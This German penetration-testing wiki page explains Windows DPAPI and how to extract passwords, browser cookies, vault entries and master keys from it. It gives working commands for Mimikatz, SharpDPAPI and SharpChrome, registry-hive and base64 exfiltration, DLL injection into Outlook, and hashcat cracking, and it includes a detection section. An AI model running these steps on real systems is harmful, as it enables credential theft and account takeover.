# DPAPI – Passwörter extrahieren

{{#include ../../banners/hacktricks-training.md}}



## Was ist DPAPI

Die Data Protection API (DPAPI) wird hauptsächlich im Windows-Betriebssystem für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet. Dabei dienen Benutzer- oder Systemgeheimnisse als wichtige Entropiequelle. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler: Sie können Daten mit einem Schlüssel verschlüsseln, der aus den Anmeldegeheimnissen des Benutzers oder bei der Systemverschlüsselung aus den Domänenauthentifizierungsgeheimnissen des Systems abgeleitet wird. Dadurch müssen Entwickler den Schutz des Verschlüsselungsschlüssels nicht selbst verwalten.

DPAPI wird am häufigsten über die Funktionen **`CryptProtectData` und `CryptUnprotectData`** verwendet. Sie ermöglichen Anwendungen, Daten im Sicherheitskontext des aktuell angemeldeten Prozesses zu verschlüsseln und zu entschlüsseln. Standardmäßig können die Daten nur durch denselben Benutzer- oder Systemkontext entschlüsselt werden, der sie verschlüsselt hat.<sup>[[2]](#references)[[3]](#references)</sup>

Diese Funktionen akzeptieren außerdem einen optionalen **Entropieparameter**, der bei der Verschlüsselung und Entschlüsselung verwendet wird. Mit optionaler Entropie geschützte Daten können nur mit demselben Entropiewert entschlüsselt werden.<sup>[[2]](#references)[[6]](#references)</sup>

### Generierung von Benutzerschlüsseln

DPAPI leitet aus den Anmeldedaten des Benutzers einen benutzerspezifischen Wert ab, der oft **Pre-Key** genannt wird. Die genaue Ableitung hängt vom Konto und der Betriebssystemversion ab. Impacket verwendet beispielsweise einen HMAC-SHA1-Pfad auf Grundlage des SHA-1-Digests des UTF-16LE-Passworts, einen weiteren auf Grundlage des MD4-/NT-Hashes des Passworts sowie einen für Protected Users vorgesehenen, von PBKDF2-SHA256 abgeleiteten Pfad. Deshalb können Offline-Tools das benötigte Material oft entweder aus dem Klartextpasswort oder einem verfügbaren NT-Hash ableiten.<sup>[[2]](#references)[[10]](#references)</sup>

Das ist besonders interessant, denn wenn ein Angreifer den Passwort-Hash des Benutzers erlangen kann, kann er:

- **Alle mit DPAPI** und dem Schlüssel dieses Benutzers verschlüsselten Daten entschlüsseln, ohne eine API kontaktieren zu müssen
- Versuchen, das **Passwort offline zu knacken**, um den gültigen DPAPI-Schlüssel zu erzeugen

DPAPI verwaltet für jeden Benutzer einen oder mehrere **Master Keys**, anstatt für jeden geschützten Blob einen neuen Master Key zu erstellen. Jeder Master Key hat eine **GUID** (Globally Unique Identifier), und ein verschlüsselter Blob enthält einen Verweis darauf, welcher Master Key ihn schützt.<sup>[[2]](#references)</sup>

Master Keys werden im Verzeichnis **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gespeichert, wobei `{SID}` der Security Identifier des Benutzers ist. Die Master-Key-Datei enthält Material, das durch den **Pre-Key** des Benutzers geschützt ist, sowie bei Domänenbenutzern Wiederherstellungsmaterial, das durch einen **Domänen-Backup-Schlüssel** geschützt ist.<sup>[[2]](#references)</sup>

Beachte, dass der **Domänenschlüssel, der zum Verschlüsseln des Master Keys verwendet wird, auf den Domänencontrollern gespeichert ist und sich nie ändert**. Hat ein Angreifer also Zugriff auf den Domänencontroller, kann er den Domänen-Backup-Schlüssel abrufen und die Master Keys aller Benutzer in der Domäne entschlüsseln.<sup>[[2]](#references)</sup>

Die verschlüsselten Blobs enthalten in ihren Headern die **GUID des Master Keys**, mit dem die Daten verschlüsselt wurden.

> [!TIP]
> Mit DPAPI verschlüsselte Blobs beginnen mit **`01 00 00 00`**

Master Keys finden:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

So sehen mehrere Master Keys eines Benutzers aus:

![Was ist DPAPI – Generierung von Benutzer-Keys: So sehen mehrere Master Keys eines Benutzers aus](<../../images/image (1121).png>)

### Generierung von Machine/System-Keys

Dieser Key wird vom Computer zum Verschlüsseln von Daten verwendet. Er basiert auf dem **DPAPI_SYSTEM LSA secret**, einem speziellen Key, auf den nur der SYSTEM-Benutzer zugreifen kann. Dieser Key wird verwendet, um Daten zu verschlüsseln, auf die das System selbst zugreifen muss, beispielsweise Credentials auf Machine-Ebene oder systemweite Geheimnisse.<sup>[[2]](#references)</sup>

Beachte, dass diese Keys **kein Domain-Backup haben** und daher nur lokal zugänglich sind:

- **Mimikatz** kann darauf zugreifen, indem es mit dem Befehl `mimikatz lsadump::secrets` LSA secrets ausliest.
- Das Secret ist in der Registry gespeichert. Ein Administrator könnte daher **die DACL-Berechtigungen ändern, um darauf zuzugreifen**. Der Registry-Pfad lautet: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Eine Offline-Extraktion aus Registry-Hives ist ebenfalls möglich. Speichere beispielsweise als Administrator auf dem Zielsystem die Hives und exfiltriere sie:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Dann kannst du auf deinem Analyse-Rechner das DPAPI_SYSTEM-LSA-Secret aus den Hives wiederherstellen und damit DPAPI-Blobs im Machine-Scope entschlüsseln (zum Beispiel maschinengeschützte Anmeldedaten von Anwendungen oder WLAN-Profile):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam-spezifisches DPAPI-Beispiel:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Durch DPAPI geschützte Daten

Zu den von DPAPI geschützten persönlichen Daten gehören:

- Windows-Credentials
- Passwörter und AutoVervollständigungsdaten von Internet Explorer und Google Chrome
- E-Mail- und interne FTP-Kontopasswörter für Anwendungen wie Outlook und Windows Mail
- Passwörter für freigegebene Ordner, Ressourcen, Drahtlosnetzwerke und Windows Vault, einschließlich Verschlüsselungsschlüsseln
- Passwörter für Remotedesktopverbindungen, .NET Passport und private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
- Netzwerkpasswörter, die vom Credential Manager verwaltet werden, sowie persönliche Daten in Anwendungen, die CryptProtectData verwenden, wie Skype, MSN Messenger und weitere
- Verschlüsselte Blobs in der Registrierungsdatenbank
- ...

Zu den systemgeschützten Daten gehören:
- WLAN-Passwörter
- ...

Passwörter für geplante Tasks sind eine separate LSA-Secret-Frage. Ein Task, der mit dem [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) registriert wurde, kann ein Passwort für die Wiederherstellung eines lokalen Administrators/SYSTEM speichern; bei einem S4U-Task oder einem Task mit interaktivem Token ist nicht belegt, dass ein Passwort gespeichert wurde. Der Principal und der Anmeldetyp eines Tasks sind aussagekräftigere Hinweise als der Name des Ausführungskontos allein.

### Optionen zum Extrahieren von Master Keys

- Wenn der Benutzer über Domänenadministratorrechte verfügt, kann er auf den **Domänen-Backup-Schlüssel** zugreifen, um alle Benutzer-Master-Keys in der Domäne zu entschlüsseln:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Mit lokalen Administratorrechten ist es möglich, **auf den LSASS-Speicher zuzugreifen**, um die DPAPI-Masterschlüssel aller angemeldeten Benutzer sowie den SYSTEM-Schlüssel zu extrahieren.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Wenn der Benutzer über lokale Administratorrechte verfügt, kann er auf das **DPAPI_SYSTEM-LSA-Geheimnis** zugreifen, um die Master Keys des Computers zu entschlüsseln:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, kannst du die **Master Keys des Benutzers direkt entschlüsseln**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Wenn du dich in einer Sitzung als Benutzer befindest, kannst du möglicherweise den **Backup-Schlüssel zum Entschlüsseln der Master-Schlüssel über RPC** beim DC anfordern. Wenn du lokaler Administrator bist und der Benutzer angemeldet ist, könntest du **sein Sitzungstoken stehlen**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Vault auflisten

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Auf DPAPI-verschlüsselte Daten zugreifen

### DPAPI-verschlüsselte Daten finden

Häufige **geschützte Dateien** von Benutzern befinden sich unter:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Ersetze in den obigen Pfaden auch `\Roaming\` durch `\Local\`.

Beispiele für die Aufzählung:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kann DPAPI-verschlüsselte Blobs im Dateisystem, in der Registry und in B64-Blobs finden:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Beachte, dass [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aus demselben Repo) verwendet werden kann, um sensible Daten wie Cookies mit DPAPI zu entschlüsseln.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron-Schnellrezepte (SharpChrome)

- Aktueller Benutzer, interaktive Entschlüsselung gespeicherter Logins/Cookies (funktioniert auch mit app-bound Cookies ab Chrome 127, da der zusätzliche Schlüssel im Benutzerkontext aus dem Credential Manager des Benutzers aufgelöst wird):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Offline-Analyse, wenn du nur Dateien hast. Extrahiere zuerst den AES state key aus dem „Local State“ des Profils und verwende ihn dann, um die Cookie-DB zu entschlüsseln:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- Domänenweite/Remote-Triage, wenn du den DPAPI-Domänen-Backup-Key (PVK) und Adminrechte auf dem Zielhost hast:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Wenn du den DPAPI-Prekey/die Credkey eines Benutzers (aus LSASS) hast, kannst du das Passwort-Cracking überspringen und Profildaten direkt entschlüsseln:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Hinweise
- Neuere Chrome-/Edge-Versionen speichern bestimmte Cookies möglicherweise mit „App-Bound“-Verschlüsselung. Diese Cookies lassen sich offline nicht ohne den zusätzlichen App-Bound-Schlüssel entschlüsseln; führe SharpChrome im Kontext des Zielbenutzers aus, um ihn automatisch abzurufen. Siehe den unten referenzierten Chrome-Sicherheitsblogbeitrag.<sup>[[5]](#references)</sup>

### Zugriffsschlüssel und Daten

- **Verwende SharpDPAPI**, um Anmeldedaten aus DPAPI-verschlüsselten Dateien der aktuellen Sitzung auszulesen:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Anmeldedaten abrufen**, z. B. die verschlüsselten Daten und den guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Auf Masterkeys zugreifen**:

Einen Masterkey eines Benutzers entschlüsseln, indem du den **domain backup key** per RPC anforderst:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

Das Tool **SharpDPAPI** unterstützt außerdem diese Argumente zur Entschlüsselung von masterkeys (beachte, dass sich mit `/rpc` der Backup-Schlüssel der Domäne abrufen lässt, mit `/password` ein Klartextpasswort verwenden lässt oder mit `/pvk` eine Datei mit dem privaten DPAPI-Domänenschlüssel angegeben werden kann...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Daten mit einem masterkey entschlüsseln**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

Das **SharpDPAPI**-Tool unterstützt auch diese Argumente für die Entschlüsselung von `credentials|vaults|rdg|keepass|triage|blob|ps` (beachte, dass `/rpc` verwendet werden kann, um den domain backup key abzurufen, `/password`, um ein Klartextpasswort zu verwenden, `/pvk`, um eine DPAPI-Domänen-Private-Key-Datei anzugeben, und `/unprotect`, um die Sitzung des aktuellen Benutzers zu verwenden ...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- Einen DPAPI-Prekey/Credkey direkt verwenden (kein Passwort erforderlich)

Wenn du LSASS dumpen kannst, legt Mimikatz häufig einen DPAPI-Schlüssel pro Logon offen, mit dem sich die Masterkeys des Benutzers entschlüsseln lassen, ohne das Klartextpasswort zu kennen. Übergib diesen Wert direkt an das Tooling:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- Daten mithilfe der **aktuellen Benutzersitzung** entschlüsseln:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Offline-Entschlüsselung mit Impacket dpapi.py

Wenn du die SID und das Passwort (oder den NT-Hash) des Opfers hast, kannst du DPAPI-Masterkeys und Credential-Manager-Blobs vollständig offline mit Impackets dpapi.py entschlüsseln.<sup>[[10]](#references)[[11]](#references)</sup>

- Artefakte auf dem Datenträger identifizieren:
  - Credential-Manager-Blob(s): %APPDATA%\Microsoft\Credentials\<hex>
  - Zugehöriger Masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Wenn die Dateiübertragungstools unzuverlässig sind, base64-kodiere die Dateien auf dem Host und kopiere die Ausgabe:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Entschlüssele den Masterkey mit der SID und dem Passwort/Hash des Benutzers:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Verwende den entschlüsselten Masterkey, um den Credential-Blob zu entschlüsseln:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Dieser Workflow stellt häufig Domain-Anmeldedaten wieder her, die von Apps mithilfe des Windows Credential Manager gespeichert wurden, darunter auch administrative Konten (z. B. `*_adm`).

---

### Umgang mit optionaler Entropie („Third-party entropy“)

Einige Anwendungen übergeben einen zusätzlichen **entropy**-Wert an `CryptProtectData`. Ohne diesen Wert kann der Blob nicht entschlüsselt werden, selbst wenn der richtige masterkey bekannt ist. Die entropy zu ermitteln, ist daher unerlässlich, wenn Anmeldedaten angegriffen werden, die auf diese Weise geschützt sind (z. B. Microsoft Outlook und einige VPN-Clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ist eine DLL im User-Mode, die die DPAPI-Funktionen innerhalb des Zielprozesses hookt und jede übergebene optionale entropy transparent aufzeichnet. Wird EntropyCapture im **DLL-injection**-Modus gegen Prozesse wie `outlook.exe` oder `vpnclient.exe` ausgeführt, gibt es eine Datei aus, die jeden entropy-Puffer dem aufrufenden Prozess und Blob zuordnet. Die aufgezeichnete entropy kann später an **SharpDPAPI** (`/entropy:`) oder **Mimikatz** (`/entropy:<file>`) übergeben werden, um die Daten zu entschlüsseln.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Offline-Cracking von Masterkeys (Hashcat & DPAPISnoop)

Microsoft führte mit Windows 10 v1607 (2016) ein Masterkey-Format mit **context 3** ein. `hashcat` v6.2.6 (Dezember 2023) ergänzte die Hash-Modi **22100** (DPAPI masterkey v1 context ), **22101** (context 1) und **22102** (context 3), die GPU-beschleunigtes Cracking von Benutzerpasswörtern direkt aus der Masterkey-Datei ermöglichen. Angreifer können daher Wordlist- oder Brute-Force-Angriffe durchführen, ohne mit dem Zielsystem zu interagieren.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatisiert diesen Prozess:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Das Tool kann auch Credential- und Vault-Blobs parsen, sie mit geknackten Schlüsseln entschlüsseln und Klartextpasswörter exportieren.<sup>[[8]](#references)</sup>


### Auf Daten anderer Computer zugreifen

In **SharpDPAPI und SharpChrome** kannst du die Option **`/server:HOST`** angeben, um auf die Daten eines Remote-Computers zuzugreifen. Natürlich musst du Zugriff auf diesen Computer haben. Im folgenden Beispiel wird angenommen, dass der **Domänensicherungsschlüssel für die Verschlüsselung bekannt ist**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## Weitere Tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis sowie des Backup-Schlüssels des Domain Controllers über RPC automatisiert. Das Skript ermittelt anschließend die IP-Adressen aller Computer und führt auf allen Computern einen smbclient-Aufruf aus, um alle DPAPI-Blobs der Benutzer abzurufen und mit dem Domain-Backup-Schlüssel zu entschlüsseln.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Mit der aus LDAP extrahierten Computerliste lassen sich alle Subnetze finden, selbst wenn sie vorher unbekannt waren!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann durch DPAPI geschützte Secrets automatisch dumpen. Die Version 2.x führte Folgendes ein:<sup>[[9]](#references)</sup>

* Parallele Erfassung von Blobs von Hunderten Hosts
* Analyse von Masterkeys mit **context 3** und automatische Integration des Hashcat-Crackings
* Unterstützung für verschlüsselte Chrome-„App-Bound“-Cookies (siehe nächsten Abschnitt)
* Einen neuen **`--snapshot`**-Modus, der Endpunkte wiederholt abfragt und neu erstellte Blobs ermittelt

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für Masterkey-/Credential-/Vault-Dateien, der Hashcat-/JtR-Formate ausgeben und optional automatisch Cracking ausführen kann. Das Tool unterstützt vollständig Maschinen- und Benutzer-Masterkey-Formate bis einschließlich Windows 11 24H1.<sup>[[8]](#references)</sup>


## Häufige Erkennungsmerkmale

- Zugriff auf Dateien in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` und anderen DPAPI-bezogenen Verzeichnissen.
    - Besonders über eine Netzwerkfreigabe wie **C$** oder **ADMIN$**.
- Einsatz von **Mimikatz**, **SharpDPAPI** oder ähnlichen Tools, um auf den LSASS-Speicher zuzugreifen oder Masterkeys zu dumpen.
- Ereignis **4662**: *An operation was performed on an object* – kann mit dem Zugriff auf das **`BCKUPKEY`**-Objekt korreliert werden.
- Ereignis **4673/4674**, wenn ein Prozess *SeTrustedCredManAccessPrivilege* anfordert (Credential Manager)

---
### Sicherheitslücken und Änderungen im Ökosystem 2023–2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ein Angreifer mit Netzwerkzugriff konnte ein Domänenmitglied dazu bringen, einen manipulierten DPAPI-Backup-Schlüssel abzurufen, wodurch sich Benutzer-Masterkeys entschlüsseln ließen. Das Problem wurde mit dem kumulativen Update vom November 2023 behoben – Administratoren sollten sicherstellen, dass DCs und Workstations vollständig gepatcht sind.<sup>[[4]](#references)</sup>
* Die „App-Bound“-Cookie-Verschlüsselung von **Chrome 127** (Juli 2024) ersetzte den bisherigen reinen DPAPI-Schutz durch einen zusätzlichen Schlüssel, der im **Credential Manager** des Benutzers gespeichert wird. Für die Offline-Entschlüsselung von Cookies sind nun sowohl der DPAPI-Masterkey als auch der **GCM-wrapped app-bound key** erforderlich. SharpChrome v2.3 und DonPAPI 2.x können den zusätzlichen Schlüssel abrufen, wenn sie im Benutzerkontext ausgeführt werden.<sup>[[5]](#references)</sup>


### Fallstudie: Zscaler Client Connector – Benutzerdefinierte Entropie aus der SID abgeleitet

Zscaler Client Connector speichert mehrere Konfigurationsdateien unter `C:\ProgramData\Zscaler` (z. B. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Jede Datei wird mit **DPAPI (Machine scope)** verschlüsselt, aber der Hersteller verwendet **benutzerdefinierte Entropie**, die *zur Laufzeit berechnet* und nicht auf der Festplatte gespeichert wird.<sup>[[1]](#references)</sup>

Die Entropie wird aus zwei Elementen neu erstellt:

1. Ein fest codiertes Secret in `ZSACredentialProvider.dll`.
2. Die **SID** des Windows-Kontos, zu dem die Konfiguration gehört.

Der von der DLL implementierte Algorithmus entspricht:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Da das Geheimnis in einer DLL eingebettet ist, die von der Festplatte gelesen werden kann, **kann jeder lokale Angreifer mit SYSTEM-Rechten die Entropie für jede SID neu generieren und die Blobs offline entschlüsseln**:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Die Entschlüsselung liefert die vollständige JSON-Konfiguration, einschließlich jeder **device posture check** und des jeweils erwarteten Werts – Informationen, die bei Versuchen, clientseitige Bypasses durchzuführen, sehr wertvoll sind.

> TIPP: Die anderen verschlüsselten Artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sind mit DPAPI **ohne** Entropie (`16` Null-Bytes) geschützt. Sie können daher direkt mit `ProtectedData.Unprotect` entschlüsselt werden, sobald SYSTEM-Rechte erlangt wurden.

## References

- [1] [Synacktiv – Sollte man seinem Zero Trust vertrauen? Zscaler-Posture-Checks umgehen](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Sicherheitsanalyse und Datenwiederherstellung in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [DPAPI-verschlüsselte Secrets mit Mimikatz und C++ auslesen](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 – Windows-DPAPI-Spoofing-Sicherheitslücke (Data Protection Application Programming Interface)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Die Sicherheit von Chrome-Cookies unter Windows verbessern](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Einfache Extraktion optionaler DPAPI-Entropie](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Versionshinweise zu hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub-Repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI-Projektseite](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: Missbrauch von AD-ACLs, Knacken von KeePassXC-Argon2 und DPAPI-Entschlüsselung bis zum DC-Admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Verwendung und Optionen](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
